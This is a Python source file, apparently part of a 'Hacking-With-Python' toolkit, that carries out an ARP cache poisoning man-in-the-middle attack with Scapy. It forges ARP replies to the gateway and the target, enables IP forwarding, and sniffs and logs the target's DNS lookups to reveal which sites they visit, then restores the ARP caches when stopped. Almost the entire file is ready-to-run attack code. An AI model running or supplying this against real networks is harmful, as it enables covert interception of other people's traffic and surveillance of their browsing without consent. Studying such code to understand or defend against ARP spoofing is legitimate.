#!/usr/bin/env python
# -*- coding: utf-8 -*-

# https://medium.com/@ismailakkila/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242

from scapy.all import *
from common_utils import menu_utils
import os
import signal
import threading
import time

""" This module uses Scapy to perform MitM attacks """


# Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should receive an ARP reply with MAC Address
def get_mac(network_iface, ip_address):
    resp, unans = sr(ARP(op=1, pdst=ip_address), iface=network_iface, verbose=False, timeout=100)
    for s, r in resp:
        return r[ARP].hwsrc
    return None


# Keep sending false ARP replies to put our machine in the middle to intercept packets
# This will use our interface MAC address as the hwsrc for the ARP reply
def _arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    menu_utils.super_highlighted_info("\nARP poison attack is ACTIVE [CTRL-C to stop]")
    while continue_poison:
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
        time.sleep(5)
    menu_utils.highlighted_info("ARP poison thread released")


# Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with correct MAC and IP Address info
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    menu_utils.highlighted_info("Reestablishing ARP cache")

    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), verbose=False,
         count=10)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), verbose=False,
         count=10)
    menu_utils.highlighted_info("Disabling IP forwarding")
    # Disable IP Forwarding on a mac
    os.system("sysctl -w net.inet.ip.forwarding=0")


def _target_dns_sniffer(pkt):

    if IP in pkt:
        if pkt[IP].src == t_ip:             # only sniffing the DNS packets of the target
            if pkt.haslayer(DNS):
                if pkt.getlayer(DNS).qr == 0:
                    domain = str(pkt.getlayer(DNS).qd.qname)
                    if domain not in domain_list:
                        domain_list[domain] = 1
                        print("%s -> %s: %s" % (pkt[IP].src, pkt[IP].dst, domain))
                    else:
                        domain_list[domain] += 1


def _stop_dns_sniffer(pkt):  # this will stop the sniffer

    if ARP in pkt:       # only filtering ARP sent from host
        if pkt[ARP].op == 2:
            if (pkt[ARP].pdst == t_ip) & (pkt[ARP].hwdst == "ff:ff:ff:ff:ff:ff") & (pkt[ARP].psrc == g_ip) & \
                    (pkt[ARP].hwsrc == g_mac):
                menu_utils.super_highlighted_info("Stopping the sniffer")
                return True

    return False


def _keyboard_interrupt_handler(signal, frame):
    global continue_poison
    continue_poison = False
    menu_utils.header("Stage 3: Stopping the eavesdropping and restoring the network")
    time.sleep(3)
    if g_mac == "not-valid":
        exit()
    else:
        poison_thread.join()
        restore_network(g_ip, g_mac, t_ip, t_mac)
    return None


def _main_keyboard_interrupt_handler(signal, frame):
    menu_utils.super_highlighted_info("\n\nThanks for using Hacking-With-Python, see you soon !\n")
    exit()


def navigation_eavesdropping_attack(network_iface, target_ip, gateway_ip):

    global h_mac, t_ip, g_ip, t_mac, g_mac, continue_poison, domain_list, poison_thread
    h_mac = get_if_hwaddr(network_iface)
    t_ip = target_ip
    g_ip = gateway_ip
    g_mac = "not-valid"
    domain_list = {}
    continue_poison = True

    signal.signal(signal.SIGINT, _keyboard_interrupt_handler)

    menu_utils.header('Navigation eavesdropping attack, target IP: %s ' % target_ip)
    menu_utils.mixed_info("Network interface: ", network_iface)
    menu_utils.mixed_info("Gateway IP: ", gateway_ip)

    menu_utils.header("Stage 1: Poisoning ARP")

    t_mac = get_mac(network_iface, t_ip)
    if t_mac is None:
        menu_utils.warning("Unable to get target MAC address")
        return None
    else:
        menu_utils.mixed_info("Target MAC address: ", t_mac)

    g_mac = get_mac(network_iface, g_ip)
    if g_mac is None:
        menu_utils.warning("Unable to get gateway MAC address")
        return None
    else:
        menu_utils.mixed_info("Gateway MAC address: ", g_mac)

    menu_utils.highlighted_info("Enabling IP forwarding")
    # Enable IP Forwarding on a mac
    os.system("sysctl -w net.inet.ip.forwarding=1")

    # ARP poison thread
    poison_thread = threading.Thread(target=_arp_poison, args=(g_ip, g_mac, t_ip, t_mac))
    poison_thread.start()

    # Sniff traffic
    menu_utils.header("Stage 2: Eavesdropping target DNS traffic")
    sniff(iface=network_iface, prn=_target_dns_sniffer, stop_filter=_stop_dns_sniffer, store=0)
    signal.signal(signal.SIGINT, _main_keyboard_interrupt_handler)
